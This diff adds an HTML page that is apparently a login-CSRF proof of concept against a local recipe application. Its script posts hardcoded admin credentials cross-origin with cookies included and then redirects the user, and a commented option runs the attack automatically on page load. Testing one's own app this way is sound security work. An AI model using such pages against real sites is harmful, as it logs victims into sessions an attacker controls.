@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Recipe Login Redirect</title>
+</head>
+<body>
+    <h2>Login CSRF & Redirect</h2>
+    <p>Status: <span id="status">Waiting for user...</span></p>
+    
+    <button id="sendBtn">Login & Go to Recipes</button>
+
+    <script>
+        function executeLogin() {
+            const url = 'https://localhost:4200/bff/account/login';
+            const targetPage = 'https://localhost:4200/recipes';
+            
+            document.getElementById('status').innerText = "Attempting login...";
+
+            const payload = {
+                userName: "admin",
+                password: "password"
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json, text/plain, */*'
+                },
+                body: JSON.stringify(payload),
+                credentials: 'include' // Important: Saves the cookie
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('status').innerText = "Login Success! Redirecting...";
+                    // 1. The cookie is now saved in the browser.
+                    // 2. We redirect the user to the application.
+                    window.location.href = targetPage;
+                } else {
+                    document.getElementById('status').innerText = "Login Failed: " + response.status;
+                }
+            })
+            .catch((error) => {
+                document.getElementById('status').innerText = 'Error: ' + error;
+                console.error('Error:', error);
+            });
+        }
+
+        // Option 1: Manual Click
+        document.getElementById('sendBtn').addEventListener('click', executeLogin);
+
+        // Option 2: Auto-Execute (The "Perfect" Attack)
+        // Uncomment the line below to run immediately when page loads
+        // executeLogin();
+    </script>
+</body>
+</html>
